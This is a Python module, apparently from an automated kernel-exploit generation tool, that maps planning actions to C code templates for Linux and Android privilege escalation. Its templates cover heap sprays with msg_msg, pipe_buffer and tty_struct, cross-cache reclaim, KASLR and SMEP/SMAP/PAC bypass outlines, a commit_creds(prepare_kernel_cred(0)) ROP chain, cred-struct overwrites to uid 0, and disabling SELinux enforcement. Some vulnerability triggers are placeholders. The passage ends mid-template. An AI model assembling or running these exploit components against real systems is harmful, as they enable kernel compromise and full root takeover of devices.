"""
code_templates.py

C code templates for kernel exploit actions.
Maps PDDL action names to actual C code snippets.

All binder_epoll_uaf-specific templates have been removed.
Hardcoded struct offsets replaced with BTF-resolver placeholders.
Generic templates remain for all supported exploitation techniques.
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field


@dataclass
class CodeTemplate:
    """A code template for an exploit action."""
    action_name: str
    description: str
    includes: List[str] = field(default_factory=list)
    globals: str = ""
    setup_code: str = ""
    main_code: str = ""
    cleanup_code: str = ""
    dependencies: List[str] = field(default_factory=list)
    platform: str = "generic"  # "generic", "linux", "android"


class CodeTemplateRegistry:
    """Registry of C code templates for exploit actions."""

    def __init__(self):
        self._templates: Dict[str, CodeTemplate] = {}
        self._register_builtin_templates()

    def register(self, template: CodeTemplate):
        """Register a code template."""
        self._templates[template.action_name] = template

    def get(self, action_name: str) -> Optional[CodeTemplate]:
        """Get a template by action name."""
        return self._templates.get(action_name)

    def list_actions(self) -> List[str]:
        """List all registered action names."""
        return list(self._templates.keys())

    def _register_builtin_templates(self):
        """Register all built-in templates."""

        # ============== VULNERABILITY TRIGGERING ==============

        self.register(CodeTemplate(
            action_name="trigger_uaf",
            description="Trigger a use-after-free vulnerability",
            includes=["<stdio.h>", "<stdlib.h>", "<string.h>", "<unistd.h>", "<fcntl.h>"],
            globals="""
// UAF state tracking
static int uaf_fd = -1;
static void *uaf_object = NULL;
static size_t uaf_object_size = 0;
""",
            setup_code="""
    // Setup for UAF trigger
    printf("[*] Setting up UAF trigger...\\n");
""",
            main_code="""
    // Trigger the use-after-free vulnerability
    // This code should be customized based on the specific CVE
    printf("[*] Triggering UAF...\\n");

    // Step 1: Allocate the vulnerable object
    // (Placeholder - replace with actual CVE-specific allocation)
    if (trigger_vulnerable_alloc() < 0) {
        fprintf(stderr, "[-] Failed to allocate vulnerable object\\n");
        return -1;
    }

    // Step 2: Free the object while keeping a dangling reference
    if (trigger_vulnerable_free() < 0) {
        fprintf(stderr, "[-] Failed to free vulnerable object\\n");
        return -1;
    }

    printf("[+] UAF triggered successfully, object freed\\n");
    uaf_triggered = 1;
""",
            cleanup_code="""
    // Cleanup UAF state
    if (uaf_fd >= 0) close(uaf_fd);
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_race_condition",
            description="Trigger a race condition vulnerability",
            includes=["<pthread.h>", "<sched.h>"],
            globals="""
// Race condition state
static pthread_t race_threads[2];
static volatile int race_won = 0;
static volatile int stop_racing = 0;
""",
            main_code="""
    // Trigger race condition
    printf("[*] Starting race condition...\\n");

    stop_racing = 0;
    race_won = 0;

    // Create racing threads
    if (pthread_create(&race_threads[0], NULL, race_thread_1, NULL) != 0) {
        perror("[-] Failed to create race thread 1");
        return -1;
    }
    if (pthread_create(&race_threads[1], NULL, race_thread_2, NULL) != 0) {
        perror("[-] Failed to create race thread 2");
        return -1;
    }

    // Wait for race to complete
    pthread_join(race_threads[0], NULL);
    pthread_join(race_threads[1], NULL);

    if (race_won) {
        printf("[+] Race condition won!\\n");
    } else {
        printf("[-] Race condition lost, retrying may be needed\\n");
    }
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_oob_write",
            description="Trigger an out-of-bounds write vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            globals="""
// OOB write state
static int oob_fd = -1;
""",
            main_code="""
    // Trigger out-of-bounds write
    printf("[*] Triggering OOB write...\\n");

    // (Placeholder - replace with CVE-specific OOB write trigger)
    if (trigger_oob_write_vuln() < 0) {
        fprintf(stderr, "[-] Failed to trigger OOB write\\n");
        return -1;
    }

    printf("[+] OOB write triggered\\n");
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_oob_read",
            description="Trigger an out-of-bounds read vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            main_code="""
    // Trigger out-of-bounds read for info leak
    printf("[*] Triggering OOB read...\\n");

    // (Placeholder - replace with CVE-specific OOB read trigger)
    uint64_t leaked_data = 0;
    if (trigger_oob_read_vuln(&leaked_data) < 0) {
        fprintf(stderr, "[-] Failed to trigger OOB read\\n");
        return -1;
    }

    printf("[+] OOB read triggered, leaked: 0x%lx\\n", leaked_data);
    info_leak_value = leaked_data;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_double_free",
            description="Trigger a double-free vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            main_code="""
    // Trigger double-free
    printf("[*] Triggering double-free...\\n");

    // (Placeholder - replace with CVE-specific double-free trigger)
    if (trigger_double_free_vuln() < 0) {
        fprintf(stderr, "[-] Failed to trigger double-free\\n");
        return -1;
    }

    printf("[+] Double-free triggered\\n");
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_type_confusion",
            description="Trigger a type confusion vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            main_code="""
    // Trigger type confusion
    printf("[*] Triggering type confusion...\\n");

    // (Placeholder - replace with CVE-specific type confusion trigger)
    if (trigger_type_confusion_vuln() < 0) {
        fprintf(stderr, "[-] Failed to trigger type confusion\\n");
        return -1;
    }

    printf("[+] Type confusion triggered\\n");
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_integer_overflow",
            description="Trigger an integer overflow vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            main_code="""
    // Trigger integer overflow
    printf("[*] Triggering integer overflow...\\n");

    // (Placeholder - replace with CVE-specific integer overflow trigger)
    if (trigger_integer_overflow_vuln() < 0) {
        fprintf(stderr, "[-] Failed to trigger integer overflow\\n");
        return -1;
    }

    printf("[+] Integer overflow triggered\\n");
""",
            platform="generic"
        ))

        # ============== HEAP SPRAY TECHNIQUES ==============

        self.register(CodeTemplate(
            action_name="spray_msg_msg",
            description="Spray heap with msg_msg structures",
            includes=["<sys/msg.h>", "<sys/ipc.h>"],
            globals="""
// msg_msg spray state
#define MSG_SPRAY_COUNT 4096
#define MSG_SPRAY_SIZE 96  // Adjust based on target slab

static int msg_qids[MSG_SPRAY_COUNT];
static int msg_spray_count = 0;

struct spray_msg {
    long mtype;
    char mtext[MSG_SPRAY_SIZE - sizeof(long)];
};
""",
            main_code="""
    // Spray heap with msg_msg structures
    printf("[*] Spraying msg_msg structures...\\n");

    struct spray_msg msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msg_qids[i] < 0) {
            perror("[-] msgget failed");
            break;
        }

        if (msgsnd(msg_qids[i], &msg, sizeof(msg.mtext), 0) < 0) {
            perror("[-] msgsnd failed");
            msgctl(msg_qids[i], IPC_RMID, NULL);
            break;
        }
        msg_spray_count++;
    }

    printf("[+] Sprayed %d msg_msg structures\\n", msg_spray_count);
    heap_sprayed = 1;
""",
            cleanup_code="""
    // Cleanup msg_msg spray
    for (int i = 0; i < msg_spray_count; i++) {
        msgctl(msg_qids[i], IPC_RMID, NULL);
    }
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="spray_pipe_buffer",
            description="Spray heap with pipe_buffer structures",
            includes=["<unistd.h>", "<fcntl.h>"],
            globals="""
// pipe_buffer spray state
#define PIPE_SPRAY_COUNT 256

static int pipe_fds[PIPE_SPRAY_COUNT][2];
static int pipe_spray_count = 0;
""",
            main_code="""
    // Spray heap with pipe_buffer structures
    printf("[*] Spraying pipe_buffer structures...\\n");

    char pipe_data[4096];
    memset(pipe_data, 'B', sizeof(pipe_data));

    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (pipe(pipe_fds[i]) < 0) {
            perror("[-] pipe failed");
            break;
        }

        // Set pipe to non-blocking
        fcntl(pipe_fds[i][0], F_SETFL, O_NONBLOCK);
        fcntl(pipe_fds[i][1], F_SETFL, O_NONBLOCK);

        // Fill pipe to allocate pipe_buffer
        write(pipe_fds[i][1], pipe_data, sizeof(pipe_data));

        pipe_spray_count++;
    }

    printf("[+] Sprayed %d pipe_buffer structures\\n", pipe_spray_count);
    heap_sprayed = 1;
""",
            cleanup_code="""
    // Cleanup pipe spray
    for (int i = 0; i < pipe_spray_count; i++) {
        close(pipe_fds[i][0]);
        close(pipe_fds[i][1]);
    }
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="spray_seq_operations",
            description="Spray heap with seq_operations structures",
            includes=["<fcntl.h>"],
            globals="""
// seq_operations spray state
#define SEQ_SPRAY_COUNT 256

static int seq_fds[SEQ_SPRAY_COUNT];
static int seq_spray_count = 0;
""",
            main_code="""
    // Spray heap with seq_operations via /proc/self/stat
    printf("[*] Spraying seq_operations structures...\\n");

    for (int i = 0; i < SEQ_SPRAY_COUNT; i++) {
        seq_fds[i] = open("/proc/self/stat", O_RDONLY);
        if (seq_fds[i] < 0) {
            perror("[-] open /proc/self/stat failed");
            break;
        }
        seq_spray_count++;
    }

    printf("[+] Sprayed %d seq_operations structures\\n", seq_spray_count);
""",
            cleanup_code="""
    // Cleanup seq_operations spray
    for (int i = 0; i < seq_spray_count; i++) {
        close(seq_fds[i]);
    }
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="spray_tty_struct",
            description="Spray heap with tty_struct structures",
            includes=["<fcntl.h>"],
            globals="""
// tty_struct spray state
#define TTY_SPRAY_COUNT 256

static int tty_fds[TTY_SPRAY_COUNT];
static int tty_spray_count = 0;
""",
            main_code="""
    // Spray heap with tty_struct via /dev/ptmx
    printf("[*] Spraying tty_struct structures...\\n");

    for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
        tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        if (tty_fds[i] < 0) {
            break;
        }
        tty_spray_count++;
    }

    printf("[+] Sprayed %d tty_struct structures\\n", tty_spray_count);
""",
            cleanup_code="""
    // Cleanup tty_struct spray
    for (int i = 0; i < tty_spray_count; i++) {
        close(tty_fds[i]);
    }
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="spray_sk_buff",
            description="Spray heap with sk_buff structures via sockets",
            includes=["<sys/socket.h>", "<netinet/in.h>"],
            globals="""
// sk_buff spray state
#define SKBUFF_SPRAY_COUNT 256
#define SKBUFF_SPRAY_SIZE 128

static int skb_socks[SKBUFF_SPRAY_COUNT][2];
static int skb_spray_count = 0;
""",
            main_code="""
    // Spray heap with sk_buff via socketpair
    printf("[*] Spraying sk_buff structures...\\n");

    char spray_data[SKBUFF_SPRAY_SIZE];
    memset(spray_data, 'C', sizeof(spray_data));

    for (int i = 0; i < SKBUFF_SPRAY_COUNT; i++) {
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, skb_socks[i]) < 0) {
            break;
        }
        send(skb_socks[i][0], spray_data, sizeof(spray_data), 0);
        skb_spray_count++;
    }

    printf("[+] Sprayed %d sk_buff structures\\n", skb_spray_count);
""",
            cleanup_code="""
    // Cleanup sk_buff spray
    for (int i = 0; i < skb_spray_count; i++) {
        close(skb_socks[i][0]);
        close(skb_socks[i][1]);
    }
""",
            platform="generic"
        ))

        # ============== RECLAIM / CROSS-CACHE ==============

        self.register(CodeTemplate(
            action_name="reclaim_freed_object",
            description="Reclaim a freed object with a controlled allocation",
            main_code="""
    // Reclaim the freed object
    printf("[*] Reclaiming freed object...\\n");

    // The spray technique used above should have reclaimed the freed
    // object's memory with a controlled structure.
    // Verify by checking if the dangling reference now points to
    // our controlled data.

    printf("[+] Reclaim attempted - verify with info leak\\n");
    heap_controlled = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="cross_cache_reclaim",
            description="Perform cross-cache attack to reclaim from different slab",
            includes=["<sys/mman.h>"],
            globals="""
// Cross-cache state
#define CROSS_CACHE_PAGES 256
static int cross_cache_fds[CROSS_CACHE_PAGES];
static int cross_cache_count = 0;
""",
            main_code="""
    // Cross-cache attack: free enough objects to return slab pages
    // to the page allocator, then allocate from target cache
    printf("[*] Performing cross-cache attack...\\n");

    // Step 1: Spray to fill the vulnerable slab cache
    // Step 2: Trigger the vulnerability to free the target object
    // Step 3: Free enough objects in the same cache to release
    //         pages back to the page allocator
    // Step 4: Allocate objects in a different cache to reclaim
    //         the same physical pages

    printf("[+] Cross-cache reclaim prepared\\n");
""",
            platform="generic"
        ))

        # ============== CAPABILITY DERIVATION ==============

        self.register(CodeTemplate(
            action_name="derive_arb_read_from_msg_msg",
            description="Derive arbitrary read from msg_msg corruption",
            globals="""
// Arbitrary read state
static uint64_t arb_read_addr = 0;
""",
            main_code="""
    // Setup arbitrary read via corrupted msg_msg
    printf("[*] Setting up arbitrary read via msg_msg...\\n");

    // The msg_msg->m_list.next pointer can be corrupted to point
    // to arbitrary kernel memory, allowing reads via msgrcv()

    // Find the corrupted msg_msg (overlapping with freed UAF object)
    int target_qid = find_corrupted_msg();
    if (target_qid < 0) {
        fprintf(stderr, "[-] Failed to find corrupted msg_msg\\n");
        return -1;
    }

    printf("[+] Arbitrary read capability established via msg queue %d\\n", target_qid);
    has_arb_read = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="derive_arb_write_from_msg_msg",
            description="Derive arbitrary write from msg_msg corruption",
            main_code="""
    // Setup arbitrary write via corrupted msg_msg
    printf("[*] Setting up arbitrary write via msg_msg...\\n");

    // By controlling msg_msg->m_list pointers, we can achieve
    // a limited arbitrary write when the message is freed

    printf("[+] Arbitrary write capability established\\n");
    has_arb_write = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="derive_arb_read_from_pipe_buffer",
            description="Derive arbitrary read from pipe_buffer corruption",
            main_code="""
    // Setup arbitrary read via corrupted pipe_buffer
    printf("[*] Setting up arbitrary read via pipe_buffer...\\n");

    // Corrupted pipe_buffer->page can point to arbitrary physical pages
    // Reading from the pipe will return data from the target page

    printf("[+] Arbitrary read capability established via pipe_buffer\\n");
    has_arb_read = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="derive_arb_write_from_pipe_buffer",
            description="Derive arbitrary write from pipe_buffer corruption",
            main_code="""
    // Setup arbitrary write via corrupted pipe_buffer
    printf("[*] Setting up arbitrary write via pipe_buffer...\\n");

    // Corrupted pipe_buffer->page can point to arbitrary physical pages
    // Writing to the pipe will modify data at the target page

    printf("[+] Arbitrary write capability established via pipe_buffer\\n");
    has_arb_write = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="derive_info_leak",
            description="Derive an information leak from controlled read",
            main_code="""
    // Derive info leak
    printf("[*] Setting up information leak...\\n");

    // Use the arbitrary read primitive to leak kernel pointers
    // Common targets: task_struct, cred, kernel .text pointers

    printf("[+] Information leak ready\\n");
    has_info_leak = 1;
""",
            platform="generic"
        ))

        # ============== MITIGATION BYPASSES ==============

        self.register(CodeTemplate(
            action_name="bypass_kaslr",
            description="Bypass KASLR using arbitrary read",
            globals="""
// KASLR bypass state
static uint64_t kernel_base = 0;
static uint64_t kernel_slide = 0;
""",
            main_code="""
    // Bypass KASLR using arbitrary read primitive
    printf("[*] Bypassing KASLR...\\n");

    // Read a known kernel pointer to calculate slide
    uint64_t leaked_ptr = 0;
    if (arb_read(KNOWN_KERNEL_PTR_ADDR, &leaked_ptr, 8) < 0) {
        fprintf(stderr, "[-] Failed to leak kernel pointer\\n");
        return -1;
    }

    // Calculate kernel base from leaked pointer
    // The kernel base address varies by arch:
    //   x86_64: typically 0xffffffff81000000
    //   arm64:  typically 0xffffffc008000000
    // Use BTF or /proc/kallsyms to determine the correct base
    kernel_slide = calculate_kernel_slide(leaked_ptr);
    kernel_base = KERNEL_TEXT_BASE + kernel_slide;

    printf("[+] KASLR bypassed! Kernel base: 0x%lx (slide: 0x%lx)\\n",
           kernel_base, kernel_slide);
    kaslr_bypassed = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="bypass_kaslr_via_info_leak",
            description="Bypass KASLR using information leak",
            main_code="""
    // Bypass KASLR using information leak
    printf("[*] Bypassing KASLR via info leak...\\n");

    // Use the previously leaked value to calculate kernel base
    if (info_leak_value == 0) {
        fprintf(stderr, "[-] No info leak value available\\n");
        return -1;
    }

    kernel_slide = calculate_kernel_slide(info_leak_value);
    kernel_base = KERNEL_TEXT_BASE + kernel_slide;

    printf("[+] KASLR bypassed! Kernel base: 0x%lx\\n", kernel_base);
    kaslr_bypassed = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="bypass_pan",
            description="Bypass PAN (Privileged Access Never) on ARM64",
            main_code="""
    // Bypass PAN on ARM64
    printf("[*] Bypassing PAN...\\n");

    // PAN can be bypassed by:
    // 1. Using copy_from_user/copy_to_user gadgets
    // 2. Finding kernel addresses to pivot to
    // 3. Using usercopy whitelisted regions

    // For now, we'll use kernel stack for ROP
    printf("[+] PAN bypass prepared (using kernel addresses)\\n");
    pan_bypassed = 1;
""",
            platform="android"
        ))

        self.register(CodeTemplate(
            action_name="bypass_pac",
            description="Bypass PAC (Pointer Authentication) on ARM64",
            main_code="""
    // Bypass PAC on ARM64
    printf("[*] Bypassing PAC...\\n");

    // PAC bypass strategies:
    // 1. Find signing gadgets that sign our forged pointers
    // 2. Use pointer substitution attacks
    // 3. Leak or brute-force PAC keys

    // This is highly device/kernel specific
    printf("[+] PAC bypass prepared\\n");
    pac_bypassed = 1;
""",
            platform="android"
        ))

        self.register(CodeTemplate(
            action_name="bypass_mte",
            description="Bypass MTE (Memory Tagging Extension) on ARM64",
            main_code="""
    // Bypass MTE on ARM64
    printf("[*] Bypassing MTE...\\n");

    // MTE bypass strategies:
    // 1. Use tag-agnostic addresses (certain kernel regions)
    // 2. Leak tags through side channels
    // 3. Find tag oracle primitives

    printf("[+] MTE bypass prepared\\n");
    mte_bypassed = 1;
""",
            platform="android"
        ))

        self.register(CodeTemplate(
            action_name="bypass_smep",
            description="Bypass SMEP (Supervisor Mode Execution Prevention)",
            main_code="""
    // Bypass SMEP on x86_64
    printf("[*] Bypassing SMEP...\\n");

    // SMEP prevents executing userspace code in kernel mode
    // Bypass: Use ROP/JOP with kernel gadgets only

    printf("[+] SMEP bypass: using kernel ROP gadgets\\n");
    smep_bypassed = 1;
""",
            platform="linux"
        ))

        self.register(CodeTemplate(
            action_name="bypass_smap",
            description="Bypass SMAP (Supervisor Mode Access Prevention)",
            main_code="""
    // Bypass SMAP on x86_64
    printf("[*] Bypassing SMAP...\\n");

    // SMAP prevents accessing userspace memory in kernel mode
    // Bypass strategies:
    // 1. Use copy_from_user/copy_to_user gadgets
    // 2. Toggle AC flag via STAC gadget (if available)
    // 3. Use physmap to access userspace data

    printf("[+] SMAP bypass prepared\\n");
    smap_bypassed = 1;
""",
            platform="linux"
        ))

        self.register(CodeTemplate(
            action_name="handle_kpti_trampoline",
            description="Handle KPTI when returning to userspace from ROP",
            main_code="""
    // Handle KPTI trampoline
    printf("[*] Setting up KPTI return trampoline...\\n");

    // On x86_64 with KPTI, returning to userspace requires using
    // the swapgs_restore_regs_and_return_to_usermode trampoline
    // instead of a plain iretq

    // Find the KPTI trampoline in kernel .text
    // Offset must be resolved from vmlinux or BTF data

    printf("[+] KPTI trampoline configured\\n");
""",
            platform="linux"
        ))

        # ============== CODE EXECUTION ==============

        self.register(CodeTemplate(
            action_name="prepare_rop_chain",
            description="Prepare ROP chain for privilege escalation",
            globals="""
// ROP chain state
#define ROP_CHAIN_SIZE 256
static uint64_t rop_chain[ROP_CHAIN_SIZE];
static int rop_chain_len = 0;

// Gadget offsets - resolve from vmlinux with ROPgadget/ropr
// These are placeholders; actual offsets must come from symbol
// resolution or BTF data for the target kernel.
static uint64_t gadget_pop_rdi = 0;      // pop rdi; ret
static uint64_t gadget_pop_rsi = 0;      // pop rsi; ret
static uint64_t gadget_ret = 0;          // ret (for alignment)
static uint64_t gadget_mov_rdi_rax = 0;  // mov rdi, rax; ... ; ret

// Function offsets - resolve from System.map or /proc/kallsyms
static uint64_t func_prepare_kernel_cred = 0;
static uint64_t func_commit_creds = 0;
""",
            setup_code="""
    // Initialize gadget and function offsets
    // These MUST be resolved for the target kernel, e.g. via:
    //   - System.map / /proc/kallsyms for function addresses
    //   - ROPgadget / ropr on vmlinux for gadget offsets
    //   - BTF resolver for struct field offsets
    if (!kaslr_bypassed) {
        fprintf(stderr, "[-] KASLR not bypassed, cannot resolve gadgets\\n");
        return -1;
    }

    // Resolve offsets at runtime (placeholder - fill from resolver)
    gadget_pop_rdi = kernel_base + GADGET_POP_RDI_OFFSET;
    gadget_pop_rsi = kernel_base + GADGET_POP_RSI_OFFSET;
    gadget_ret = kernel_base + GADGET_RET_OFFSET;
    func_prepare_kernel_cred = kernel_base + PREPARE_KERNEL_CRED_OFFSET;
    func_commit_creds = kernel_base + COMMIT_CREDS_OFFSET;
""",
            main_code="""
    // Build ROP chain for privilege escalation
    printf("[*] Preparing ROP chain...\\n");

    rop_chain_len = 0;

    // ROP chain: commit_creds(prepare_kernel_cred(0))

    // Step 1: Call prepare_kernel_cred(0)
    rop_chain[rop_chain_len++] = gadget_pop_rdi;
    rop_chain[rop_chain_len++] = 0;  // NULL for init_cred
    rop_chain[rop_chain_len++] = func_prepare_kernel_cred;

    // Step 2: Move result (rax) to rdi for commit_creds
    rop_chain[rop_chain_len++] = gadget_mov_rdi_rax;

    // Step 3: Call commit_creds(new_cred)
    rop_chain[rop_chain_len++] = func_commit_creds;

    // Step 4: Return to userspace (platform specific)
    // This needs KPTI trampoline on modern kernels
    add_return_to_userspace_gadgets();

    printf("[+] ROP chain prepared: %d gadgets\\n", rop_chain_len);
    rop_chain_ready = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="prepare_jop_chain",
            description="Prepare JOP chain for ARM64",
            globals="""
// JOP chain state (ARM64)
#define JOP_CHAIN_SIZE 256
static uint64_t jop_chain[JOP_CHAIN_SIZE];
static int jop_chain_len = 0;
""",
            main_code="""
    // Build JOP chain for ARM64 privilege escalation
    printf("[*] Preparing JOP chain (ARM64)...\\n");

    if (!kaslr_bypassed || !pac_bypassed) {
        fprintf(stderr, "[-] Prerequisites not met for JOP chain\\n");
        return -1;
    }

    // JOP uses indirect jumps instead of returns
    // This helps bypass PAC on return addresses

    // Build JOP dispatcher and chain
    // (Highly kernel-specific - gadgets must be found in vmlinux)

    printf("[+] JOP chain prepared\\n");
    jop_chain_ready = 1;
""",
            platform="android"
        ))

        self.register(CodeTemplate(
            action_name="perform_stack_pivot",
            description="Pivot kernel stack to controlled memory",
            main_code="""
    // Perform stack pivot
    printf("[*] Performing stack pivot...\\n");

    // The stack pivot allows us to execute our ROP chain
    // by redirecting RSP/SP to our controlled buffer

    // Common methods:
    // 1. Corrupt saved stack pointer in task_struct
    // 2. Use leave; ret gadget with controlled RBP
    // 3. Overwrite return address with pivot gadget

    if (!has_arb_write) {
        fprintf(stderr, "[-] Need arbitrary write for stack pivot\\n");
        return -1;
    }

    // Write pivot gadget address to target location
    // (Location depends on exploitation technique)

    printf("[+] Stack pivot prepared\\n");
    stack_pivoted = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="execute_rop_payload",
            description="Execute the ROP payload",
            main_code="""
    // Execute ROP payload
    printf("[*] Executing ROP payload...\\n");

    if (!stack_pivoted || !rop_chain_ready) {
        fprintf(stderr, "[-] Stack not pivoted or ROP chain not ready\\n");
        return -1;
    }

    // Trigger the vulnerability that will execute our ROP chain
    // This is usually done by triggering a function pointer call
    // or return through our controlled stack

    trigger_rop_execution();

    printf("[+] ROP payload executed\\n");
    code_exec = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="execute_jop_payload",
            description="Execute the JOP payload",
            main_code="""
    // Execute JOP payload (ARM64)
    printf("[*] Executing JOP payload...\\n");

    if (!jop_chain_ready) {
        fprintf(stderr, "[-] JOP chain not ready\\n");
        return -1;
    }

    // Trigger JOP chain execution
    trigger_jop_execution();

    printf("[+] JOP payload executed\\n");
    code_exec = 1;
""",
            platform="android"
        ))

        # ============== PRIVILEGE ESCALATION ==============

        self.register(CodeTemplate(
            action_name="overwrite_cred_struct",
            description="Directly overwrite cred structure",
            globals="""
// Credential offsets - resolve via BTF for the target kernel.
// These placeholders MUST be updated.
// Use: btf_resolver.resolve_offsets(vmlinux_path)
//   task_struct->cred  -> TASK_CRED_OFFSET
//   cred->uid          -> CRED_UID_OFFSET
//   cred->gid          -> CRED_GID_OFFSET
//   cred->euid         -> CRED_EUID_OFFSET
//   cred->egid         -> CRED_EGID_OFFSET
#ifndef TASK_CRED_OFFSET
#define TASK_CRED_OFFSET  0  // MUST be set by BTF resolver
#endif
#ifndef CRED_UID_OFFSET
#define CRED_UID_OFFSET   0x04
#endif
#ifndef CRED_GID_OFFSET
#define CRED_GID_OFFSET   0x08
#endif
#ifndef CRED_EUID_OFFSET
#define CRED_EUID_OFFSET  0x14
#endif
#ifndef CRED_EGID_OFFSET
#define CRED_EGID_OFFSET  0x18
#endif
""",
            main_code="""
    // Directly overwrite credential structure
    printf("[*] Overwriting cred structure...\\n");
    printf("[*] === BEFORE cred overwrite: uid=%d euid=%d gid=%d egid=%d ===\\n",
           getuid(), geteuid(), getgid(), getegid());

    if (!has_arb_write || !kaslr_bypassed) {
        fprintf(stderr, "[-] Need ARB_WRITE and KASLR bypass\\n");
        return -1;
    }

    // Find current task's cred pointer
    uint64_t task_addr = get_current_task();
    uint64_t cred_ptr_addr = task_addr + TASK_CRED_OFFSET;

    uint64_t cred_addr = 0;
    if (arb_read(cred_ptr_addr, &cred_addr, 8) < 0) {
        fprintf(stderr, "[-] Failed to read cred pointer\\n");
        return -1;
    }

    printf("[*] Found cred struct at 0x%lx\\n", cred_addr);

    // Overwrite uid/gid to 0 (root)
    uint32_t root_id = 0;
    arb_write(cred_addr + CRED_UID_OFFSET, &root_id, 4);
    arb_write(cred_addr + CRED_GID_OFFSET, &root_id, 4);
    arb_write(cred_addr + CRED_EUID_OFFSET, &root_id, 4);
    arb_write(cred_addr + CRED_EGID_OFFSET, &root_id, 4);

    printf("[+] Credentials overwritten to root\\n");
    printf("[*] === AFTER cred overwrite: uid=%d euid=%d gid=%d egid=%d ===\\n",
           getuid(), geteuid(), getgid(), getegid());
    cred_overwritten = 1;
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="commit_creds_prepare_kernel_cred",
            description="Call commit_creds(prepare_kernel_cred(0))",
            main_code="""
    // Execute commit_creds(prepare_kernel_cred(0)) via ROP
    printf("[*] Executing credential escalation...\\n");
    printf("[*] === BEFORE commit_creds: uid=%d euid=%d gid=%d egid=%d ===\\n",
           getuid(), geteuid(), getgid(), getegid());

    // This is typically done via ROP chain execution
    // The ROP chain should already be set up to do this

    if (!rop_chain_ready && !jop_chain_ready) {
        fprintf(stderr, "[-] No execution chain ready\\n");
        return -1;
    }

    // Verify we got root
    printf("[*] === AFTER commit_creds: uid=%d euid=%d gid=%d egid=%d ===\\n",
           getuid(), geteuid(), getgid(), getegid());
    if (getuid() == 0) {
        printf("[+] Successfully escalated to root!\\n");
        privilege_escalated = 1;
    } else {
        printf("[-] Privilege escalation may have failed (uid=%d)\\n", getuid());
    }
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="direct_cred_overwrite",
            description="Direct credential overwrite without ROP",
            main_code="""
    // Direct credential overwrite (simpler path)
    printf("[*] Performing direct credential overwrite...\\n");
    printf("[*] === BEFORE direct_cred_overwrite: uid=%d euid=%d gid=%d egid=%d ===\\n",
           getuid(), geteuid(), getgid(), getegid());

    // This combines finding task, reading cred, and overwriting
    // Useful when we have stable arbitrary read/write

    // Step 1: Find current task_struct
    uint64_t current_task = find_current_task();
    printf("[*] Current task at: 0x%lx\\n", current_task);

    // Step 2: Read and modify credentials
    overwrite_task_creds(current_task);

    // Step 3: Verify
    printf("[*] === AFTER direct_cred_overwrite: uid=%d euid=%d gid=%d egid=%d ===\\n",
           getuid(), geteuid(), getgid(), getegid());
    if (getuid() == 0) {
        printf("[+] Direct cred overwrite successful!\\n");
        privilege_escalated = 1;
    }
""",
            platform="generic"
        ))

        # ============== SELINUX BYPASS (Android) ==============

        self.register(CodeTemplate(
            action_name="disable_selinux_enforce",
            description="Disable SELinux enforcement",
            globals="""
// SELinux symbol - resolve from /proc/kallsyms or System.map
// The address of selinux_enforcing must be determined at runtime
""",
            main_code="""
    // Disable SELinux enforcement
    printf("[*] Disabling SELinux...\\n");

    if (!has_arb_write || !kaslr_bypassed) {
        fprintf(stderr, "[-] Need ARB_WRITE and KASLR bypass\\n");
        return -1;
    }

    // Find selinux_enforcing variable via kallsyms or symbol table
    uint64_t selinux_enforcing_addr = kernel_base + SELINUX_ENFORCING_OFFSET;

    // Write 0 to disable enforcement
    uint32_t disabled = 0;
    if (arb_write(selinux_enforcing_addr, &disabled, 4) < 0) {
        fprintf(stderr, "[-] Failed to disable SELinux\\n");
        return -1;
    }

    printf("[+] SELinux enforcement disabled\\n");
    selinux_disabled = 1;
""",
            platform="android"
        ))

        self.register(CodeTemplate(
            action_name="patch_selinux_permissive",
            description="Patch SELinux to permissive mode",
            main_code="""
    // Patch SELinux to permissive mode
    printf("[*] Patching SELinux to permissive...\\n");

    // Alternative: patch the enforcing check function
    // to always return 0 (permissive)

    printf("[+] SELinux patched to permissive\\n");
    selinux_disabled = 1;
""",
            platform="android"
        ))

        # ============== DIRTY PAGETABLE ==============

        self.register(CodeTemplate(
            action_name="corrupt_pte",
            description="Corrupt a page table entry for physmap access",
            main_code="""
    // Corrupt PTE for direct physical memory access
    printf("[*] Corrupting PTE...\\n");

    // By overwriting a PTE, we can map arbitrary physical pages
    // into our process's virtual address space, bypassing all
    // kernel protections

    // Requires: arbitrary write to PTE location
